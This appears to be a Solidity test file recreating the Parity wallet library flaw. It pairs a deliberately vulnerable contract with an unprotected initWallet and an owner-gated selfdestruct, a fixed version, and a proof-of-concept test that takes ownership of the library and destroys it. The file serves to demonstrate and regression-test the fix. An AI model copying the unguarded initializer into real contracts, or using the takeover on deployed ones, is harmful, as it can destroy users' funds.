// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

contract ParityWalletLibraryVulnerable {
    mapping(address => bool) public owner;
    bool public initialized;

    function initWallet(address newOwner) external {
        require(!initialized, "already initialized");
        owner[newOwner] = true;
        initialized = true;
    }

    function kill(address payable recipient) external {
        require(owner[msg.sender], "not owner");
        selfdestruct(recipient);
    }
}

contract ParityWalletLibraryFixed {
    address public immutable owner;
    bool public immutable initialized;

    constructor(address owner_) {
        owner = owner_;
        initialized = true;
    }

    function initWallet(address) external pure {
        revert("initialization disabled");
    }

    function kill(address payable) external pure {
        revert("destruction disabled");
    }
}

interface Vm {
    function deal(address account, uint256 newBalance) external;
}

contract ParityLibraryKillPoC {
    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    receive() external payable {}

    function testUninitializedLibraryCanBeTakenOverAndKilled() public {
        ParityWalletLibraryVulnerable libraryContract = new ParityWalletLibraryVulnerable();
        address attacker = address(this);
        uint256 startingBalance = address(this).balance;

        libraryContract.initWallet(attacker);
        require(libraryContract.owner(attacker), "attacker did not become owner");

        vm.deal(address(libraryContract), 1 ether);
        libraryContract.kill(payable(address(this)));
        require(address(this).balance == startingBalance + 1 ether, "kill did not transfer library balance");
    }

    function testFixedLibraryRejectsTakeoverAndDestruction() public {
        ParityWalletLibraryFixed libraryContract = new ParityWalletLibraryFixed(address(this));

        (bool initSucceeded, ) = address(libraryContract).call(
            abi.encodeWithSelector(ParityWalletLibraryFixed.initWallet.selector, address(this))
        );
        require(!initSucceeded, "fixed library accepted a second initialization");

        (bool killSucceeded, ) = address(libraryContract).call(
            abi.encodeWithSelector(ParityWalletLibraryFixed.kill.selector, payable(address(this)))
        );
        require(!killSucceeded, "fixed library exposed a destructive path");
    }
}
